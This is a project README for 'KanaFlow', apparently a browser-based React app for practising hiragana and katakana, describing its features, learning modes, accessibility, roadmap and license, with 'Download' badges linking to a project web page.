![preview](https://raw.githubusercontent.com/imamhamid/kana-dojo-react/main/showcase_ae22f.svg)
# 🈳 KanaFlow — A Living Playground for Japanese Syllabaries

[![Download](https://raw.githubusercontent.com/imamhamid/kana-dojo-react/main/latest_69749.svg)](https://imamhamid.github.io/kana-dojo-react/)

**KanaFlow** is a next-generation, browser-native learning environment for mastering **hiragana** and **katakana** — the twin syllabaries that form the rhythmic backbone of written Japanese. Instead of treating memorization as a chore, KanaFlow turns stroke recognition, sound recall, and reading fluency into a flowing, adaptive experience that adjusts to your pace, your mistakes, and your momentum.

Born from the spirit of open-source language tooling and refined for the 2026 web platform, KanaFlow is a single-page React application that runs entirely in the client. No accounts, no servers phoning home, no tracking pixels — just you, 46 base characters, their dakuten and handakuten cousins, and the delightful combo forms that make Japanese reading click into place.

---

## 📖 Table of Contents

- [Why KanaFlow Exists](#-why-kanaflow-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Syllabary Coverage](#-syllabary-coverage)
- [Learning Modes](#-learning-modes)
- [Accessibility & Responsive Design](#-accessibility--responsive-design)
- [Multilingual Interface](#-multilingual-interface)
- [Performance & Offline Behavior](#-performance--offline-behavior)
- [Supported Companion Tooling](#-supported-companion-tooling)
- [Roadmap 2026](#-roadmap-2026)
- [SEO-Friendly Keyword Integration](#-seo-friendly-keyword-integration)
- [Community & Contribution](#-community--contribution)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why KanaFlow Exists

Most kana trainers behave like flashcards glued to a wall. You flip, you guess, you forget, you repeat. KanaFlow was designed around a different metaphor: a **river of characters**. Each glyph you learn is a stone you place into the riverbed. As the stones accumulate, the current of reading becomes smoother, faster, and eventually second nature.

Whether you are a first-time learner sounding out your very first あ, a returning student refreshing katakana before a trip, or a polyglot collecting scripts the way others collect stamps, KanaFlow offers a gentle on-ramp and a steep-but-rewarding summit.

---

## 🧭 Core Philosophy

1. **Local-first by default.** Your progress lives in your browser. Nothing leaves your device unless you explicitly export it.
2. **Recall over recognition.** We weight questions toward active recall rather than passive multiple-choice comfort.
3. **Mistakes are data, not failure.** Every wrong answer reshapes the next question's difficulty.
4. **No dark patterns.** There is no streak-shaming, no push notifications, no "you lost your flame" guilt.
5. **Open and inspectable.** Every scoring rule is documented and testable.

---

## ✨ Feature Highlights

- 🎴 **Adaptive Spaced Repetition** — a lightweight SM-2-inspired scheduler that quietly decides when each kana should reappear.
- 🖌️ **Stroke Order Animations** — SVG-based stroke sequences that replay smoothly and can be scrubbed frame by frame.
- 🔊 **Native Pronunciation Playback** — clearly recorded or synthesized audio for every base character and combination.
- ⌨️ **Typing Trainer** — romaji-to-kana input drills that build muscle memory for real keyboards.
- 🧠 **Confusion Matrix** — a heatmap showing which kana you mix up most often (し vs つ, ソ vs ン, and other classic traps).
- 📊 **Progress Dashboard** — daily accuracy, time spent, retention curves, and projected mastery dates.
- 🎯 **Focus Sessions** — short, timer-driven sprints for learners who thrive under gentle pressure.
- 🧩 **Custom Decks** — build your own subsets (e.g., only katakana loanword characters, only dakuten forms).
- 💾 **Export & Import** — move your progress between browsers as a plain JSON payload.
- 🌗 **Dark and Light Themes** — plus a high-contrast mode for readability.
- 📱 **Progressive Web App** — installable on desktop and mobile, with offline-first caching.
- 🧑‍🏫 **Classroom Snapshot** — share a static image summarizing your kana coverage with a teacher or study partner.

---

## 🈁 Syllabary Coverage

KanaFlow ships with complete coverage of the following character families:

| Family | Count | Included Forms |
| --- | --- | --- |
| Hiragana base | 46 | あ–ん |
| Katakana base | 46 | ア–ン |
| Dakuten (hiragana) | 20 | が, ざ, だ, ば families |
| Dakuten (katakana) | 20 | ガ, ザ, ダ, バ families |
| Handakuten | 10 | ぱ / パ families |
| Yōon combos | 66+ | きゃ, しゅ, ちょ, リャ, ギュ, etc. |
| Small kana | 6 | っ, ゃ, ゅ, ょ, ァ, ィ |
| Extended katakana | optional pack | ヴ, ファ, ティ, ウィ and friends |

Each character record includes its romanization variants (Hepburn, Kunrei-shiki, and a lenient matching mode), an audio reference, and a stroke path dataset.

---

## 🎮 Learning Modes

KanaFlow doesn't force a single path. Choose the mode that matches your mood and energy level.

- **Recognition Mode** — see a kana, pick the romaji.
- **Recall Mode** — see romaji, draw or type the kana.
- **Audio Mode** — hear the sound, choose the glyph.
- **Mixed Mode** — shuffles the above based on your historical weak points.
- **Reading Mode** — short pseudo-words and real loanwords to practice in context.
- **Boss Rush** — a timed sequence of your 20 most-missed characters.

---

## ♿ Accessibility & Responsive Design

KanaFlow is built to feel at home whether you are on a ultrawide monitor, a mid-range Android tablet, or a phone held one-handed on a train.

- Fully **responsive layout** that reflows from a single column to a rich desktop dashboard.
- **Keyboard-navigable** interfaces with visible focus rings.
- **Screen-reader-friendly** labels for every interactive element.
- **Reduced-motion mode** that disables stroke animations.
- **Colorblind-safe palette** verified against common contrast guidelines.
- **Adjustable font size** for kana rendering, from tiny to generously large.
- **Touch and stylus friendly** drawing canvas for stroke practice.

---

## 🌐 Multilingual Interface

The learning content is Japanese, but the interface itself speaks many languages. KanaFlow ships with translations for:

- English
- Spanish
- German
- French
- Portuguese (Brazil)
- Italian
- Dutch
- Polish
- Turkish
- Japanese (UI only, for advanced learners)
- Simplified Chinese
- Korean

Missing a language you love? The translation files are plain JSON, and adding a new locale is one of the friendliest first contributions in this repository.

Our support rotations aim to keep a **24/7 assistance channel** staffed through a mix of core maintainers and community volunteers, so learners in any timezone can get help without waiting a full day.

---

## ⚡ Performance & Offline Behavior

KanaFlow targets sub-second interaction on mid-tier hardware.

- Route-level code splitting keeps the initial bundle small.
- Stroke animations are precomputed as SVG paths, not live vector math.
- Progress data is stored in IndexedDB with an in-memory cache.
- Service worker caches the app shell for offline use.
- No third-party analytics scripts run at any point.

---

## 🧰 Supported Companion Tooling

KanaFlow plays well with the rest of your study desk:

- **Anki** — export your kana deck as a CSV of question/answer pairs.
- **Obsidian** — embed a KanaFlow summary widget via an iframe-friendly layout.
- **Notion** — paste a generated progress table into a study journal page.
- **Text editors** — a companion romaji-to-kana converter extension is under exploration for 2026.

---

## 🗺️ Roadmap 2026

- [x] Hiragana and katakana base sets
- [x] Adaptive scheduler v1
- [x] Dark mode
- [ ] Handwriting recognition via on-device ML
- [ ] Kanji radicals preview module
- [ ] Voice-first practice sessions
- [ ] Community-shared card packs
- [ ] Native desktop wrapper

---

## 🔍 SEO-Friendly Keyword Integration

People searching for a **React kana trainer**, a **hiragana and katakana learning app**, a **Japanese syllabary practice tool**, or a **client-side spaced repetition flashcard app** should naturally find KanaFlow. This section exists to make that discoverability explicit without turning the README into a wall of repeated phrases.

Phrases you might recognize in your search history:

- learn hiragana online
- katakana practice app
- Japanese alphabet trainer
- kana flashcards with audio
- spaced repetition for kana
- stroke order practice for Japanese characters
- romaji to kana typing trainer
- offline Japanese learning PWA

If you arrived here via one of those searches, welcome — you found the right riverbank.

---

## 🤝 Community & Contribution

KanaFlow grows through small, thoughtful pull requests.

- **Bug reports** — please include your browser, OS, and a short clip or description of the behavior.
- **Feature requests** — open an issue describing the learner problem first, the proposed solution second.
- **Translations** — add a JSON locale file and reference it in the locale index.
- **Character data fixes** — stroke order corrections are especially welcome.
- **Documentation** — clearer explanations help every future learner.

Please read the contribution guide (see repository files) before opening a large change. Keep discussions kind and specific.

---

## ❓ Frequently Asked Questions

**Do I need an account?**
No. Progress is stored locally. You can optionally export it.

**Does it work without internet?**
Yes, after the first visit, thanks to service worker caching.

**Is there a mobile app?**
The web app is installable as a PWA on iOS and Android. A dedicated wrapper is on the roadmap.

**Can I use it in a classroom?**
Absolutely — the Classroom Snapshot feature was designed for exactly that.

**Is there a paid tier?**
KanaFlow is community-supported and remains openly available for personal and educational use. Optional donations fund hosting of companion services when they launch.

---

## ⚠️ Disclaimer

KanaFlow is an independent educational project. It is not affiliated with, endorsed by, or sponsored by any language school, publishing house, or certification body. Character stroke data and audio references are provided for study purposes and may differ slightly from specific regional or stylistic conventions. Learners preparing for formal examinations should cross-reference official materials. No warranty is provided regarding accuracy, availability, or fitness for a particular purpose. Use your judgment, and enjoy the journey.

---

## 📜 License

KanaFlow is released under the **MIT License**. You are welcome to read, modify, and redistribute the code in accordance with its terms.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 KanaFlow contributors.

---

[![Download](https://raw.githubusercontent.com/imamhamid/kana-dojo-react/main/latest_69749.svg)](https://imamhamid.github.io/kana-dojo-react/)